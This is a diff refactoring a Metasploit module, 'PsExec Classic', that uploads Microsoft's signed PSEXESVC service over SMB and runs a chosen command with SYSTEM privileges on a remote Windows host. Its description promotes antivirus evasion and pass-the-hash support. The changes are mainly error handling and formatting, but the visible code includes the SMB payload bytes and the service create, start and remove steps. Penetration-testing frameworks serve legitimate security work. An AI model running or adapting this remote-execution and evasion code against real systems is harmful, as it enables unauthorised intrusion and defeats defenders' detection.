@@ -19,11 +19,18 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
                       'Name'           => 'PsExec Classic',
                       'Description'    => %q{
-This module mimics the classic PsExec tool from Microsoft SysInternals. Anti-virus software has recently rendered the commonly-used exploit/windows/smb/psexec module much less useful
-because the uploaded executable stub is usually detected and deleted before it can be used.  This module sends the same code to the target as the authentic PsExec
-(which happens to have a digital signature from Microsoft), thus anti-virus software cannot distinguish the difference.  AV cannot block it without also blocking the authentic version.
-Of course, this module also supports pass-the-hash, which the authentic PsExec does not.  You must provide a local path to the authentic PsExec.exe (via the PSEXEC_PATH option)
-so that the PSEXESVC.EXE service code can be extracted and uploaded to the target.  The specified command (via the COMMAND option) will be executed with SYSTEM privileges.
+This module mimics the classic PsExec tool from Microsoft SysInternals. 
+Anti-virus software has recently rendered the commonly-used
+exploit/windows/smb/psexec module much less useful because the uploaded
+executable stub is usually detected and deleted before it can be used.  This
+module sends the same code to the target as the authentic PsExec (which
+happens to have a digital signature from Microsoft), thus anti-virus software
+cannot distinguish the difference.  AV cannot block it without also blocking
+the authentic version.  Of course, this module also supports pass-the-hash,
+which the authentic PsExec does not.  You must provide a local path to the
+authentic PsExec.exe (via the PSEXEC_PATH option) so that the PSEXESVC.EXE
+service code can be extracted and uploaded to the target.  The specified
+command (via the COMMAND option) will be executed with SYSTEM privileges.
                         },
                       'Author'         =>
                       [
@@ -43,25 +50,22 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
                      ], self.class )
   end
 
-  def run()
+  def run
     psexec_path = datastore['PSEXEC_PATH']
     command = datastore['COMMAND']
 
     psexesvc,psexec_version = extract_psexesvc(psexec_path, true)
 
     print_status("Connecting to #{datastore['RHOST']}...")
-    if not connect
-      print_error("Failed to connect.")
-      return false
+    unless connect
+      fail_with(Failure::Unreachable, 'Failed to connect.')
     end
 
     print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
     smb_login
 
     if (not simple.client.auth_user)
-      print_error("Server granted only Guest privileges.")
-      disconnect
-      return false
+      fail_with(Failure::NoAccess, 'Server granted only Guest privileges.')
     end
 
 
@@ -103,8 +107,7 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
       print_status('Obtaining a service control manager handle...')
       scm_handle = dce_openscmanagerw(dcerpc, datastore['RHOST'])
       if scm_handle == nil
-        print_error('Failed to obtain handle to service control manager.')
-        return
+        fail_with(Failure::Unknown, 'Failed to obtain handle to service control manager.')
       end
 
       # Create the service.
@@ -117,17 +120,16 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
                                         '%SystemRoot%\PSEXESVC.EXE', # Binary path
                                         {:type => 0x00000010}) # Type: Own process
         if svc_handle == nil
-          print_error('Error while creating new service.')
-          return
+          fail_with(Failure::Unknown, 'Error while creating new service.')
         end
 
         # Close the handle to the service.
-        if not dce_closehandle(dcerpc, svc_handle)
+        unless dce_closehandle(dcerpc, svc_handle)
           print_error('Failed to close service handle.')
           # If this fails, we can still continue...
         end
 
-      rescue ::Exception => e
+      rescue Rex::Proto::DCERPC::Exceptions::Fault => e
         # An exception can occur if the service already exists due to a prior unclean shutdown.  We can try to
         # continue anyway.
       end
@@ -137,20 +139,17 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
       print_status('Opening service...')
       svc_handle = dce_openservicew(dcerpc, scm_handle, 'PSEXESVC')
       if svc_handle == nil
-        print_error('Failed to open service.')
-        return
+        fail_with(Failure::Unknown, 'Failed to open service.')
       end
 
       # Start the service.
       print_status('Starting the service...')
-      if not dce_startservice(dcerpc, svc_handle)
-        print_error('Failed to start the service.')
-        return
+      unless dce_startservice(dcerpc, svc_handle)
+        fail_with(Failure::Unknown, 'Failed to start the service.')
       end
 
-    rescue ::Exception => e
-      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
-      return
+    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
+      fail_with(Failure::Unknown, "#{e}\n#{e.backtrace.join("\n")}")
     end
 
 
@@ -161,8 +160,7 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
     elsif psexec_version == 2.0
       psexesvc_pipe_name = 'PSEXESVC'
     else
-      print_error("Internal error.  A PsExec version of #{psexec_version} is not valid!")
-      return
+      fail_with(Failure::Unknown, "Internal error.  A PsExec version of #{psexec_version} is not valid!")
     end
 
     # Open a pipe to the right service.
@@ -193,6 +191,11 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
 
     # In the first message, we tell the service our made-up
     # hostname and PID, and tell it what program to execute.
+    data = "\xee\x58\x4a\x58\x4a\x00\x00" << random_client_pid_low.chr <<
+      random_client_pid_high.chr << "\x00\x00" <<
+      Rex::Text.to_unicode(random_hostname) <<
+      ("\x00" * 496) << Rex::Text.to_unicode(command) <<
+      ("\x00" * (3762 - (command.length * 2)))
     smbclient.write_raw({'file_id' => psexecsvc_proc.file_id,
                          'flags1' => 0x18,
                          'flags2' => 0xc807,
@@ -207,13 +210,8 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
                          'data_offset' => 64,
                          'high_offset' => 0,
                          'byte_count' => 4293,
-                         'data' => "\xee\x58\x4a\x58\x4a\x00\x00" <<
-                           random_client_pid_low.chr <<
-                           random_client_pid_high.chr << "\x00\x00" <<
-                           Rex::Text.to_unicode(random_hostname) <<
-                           ("\x00" * 496) << Rex::Text.to_unicode(command) <<
-                           ("\x00" * (3762 - (command.length * 2))),
-                          'do_recv' => true})
+                         'data' => data,
+                         'do_recv' => true})
 
     # In the next three messages, we just send lots of zero bytes...
     smbclient.write_raw({'file_id' => psexecsvc_proc.file_id,
@@ -287,7 +285,9 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
                          'data_offset' => 64,
                          'high_offset' => 0,
                          'byte_count' => 1873,
-                         'data' => "\xee" << ("\x00" * 793) << "\x01" << ("\x00" * 14) << "\xff\xff\xff\xff" << ("\x00" * 1048) << "\x01" << ("\x00" * 11),
+                         'data' => "\xee" << ("\x00" * 793) << "\x01" <<
+                            ("\x00" * 14) << "\xff\xff\xff\xff" <<
+                            ("\x00" * 1048) << "\x01" << ("\x00" * 11),
                          'do_recv' => true})
 
 
@@ -367,7 +367,7 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
         end
 
         # If the user entered some input.
-        if (r != nil) and (r.include? $stdin)
+        if r and r.include? $stdin
 
           # There's actually an entire line of text available, but the
           # standard PsExec.exe client sends one byte at a time, so we'll
@@ -415,7 +415,7 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
           last_char = data
         end
       end
-    rescue ::Exception => e
+    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
       print_error("Error: #{e}")
       print_status('Attempting to terminate gracefully...')
     end
@@ -431,33 +431,37 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
     # Stop the service.
     begin
       print_status('Stopping the service...')
-      if not dce_stopservice(dcerpc, svc_handle)
+      unless dce_stopservice(dcerpc, svc_handle)
         print_error('Error while stopping the service.')
         # We will try to continue anyway...
       end
-    rescue ::Exception => e
+    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
       print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
     end
 
     # Wait a little bit for it to stop before we delete the service.
-    if wait_for_service_to_stop(svc_handle) == false
-      print_error('Could not stop the PSEXECSVC service.  Attempting to continue cleanup...')
+    begin
+      if wait_for_service_to_stop(svc_handle) == false
+        print_error('Could not stop the PSEXECSVC service.  Attempting to continue cleanup...')
+      end
+    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
+      print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
     end
 
     # Delete the service.
     begin
       print_status("Removing the service...")
-      if not dce_deleteservice(dcerpc, svc_handle)
+      unless dce_deleteservice(dcerpc, svc_handle)
         print_error('Error while deleting the service.')
         # We will try to continue anyway...
       end
 
       print_status("Closing service handle...")
-      if not dce_closehandle(dcerpc, svc_handle)
+      unless dce_closehandle(dcerpc, svc_handle)
         print_error('Error while closing the service handle.')
         # We will try to continue anyway...
       end
-    rescue ::Exception => e
+    rescue Rex::Proto::SMB::Exceptions::InvalidType => e
       print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
     end
 
@@ -512,7 +516,7 @@ so that the PSEXESVC.EXE service code can be extracted and uploaded to the targe
     service_stopped = false
     retries = 0
     while (retries < 3) and (service_stopped == false)
-      select(nil, nil, nil, retries)
+      Rex.sleep(retries)
 
       if dce_queryservice(dcerpc, svc_handle) == 2
         service_stopped = true
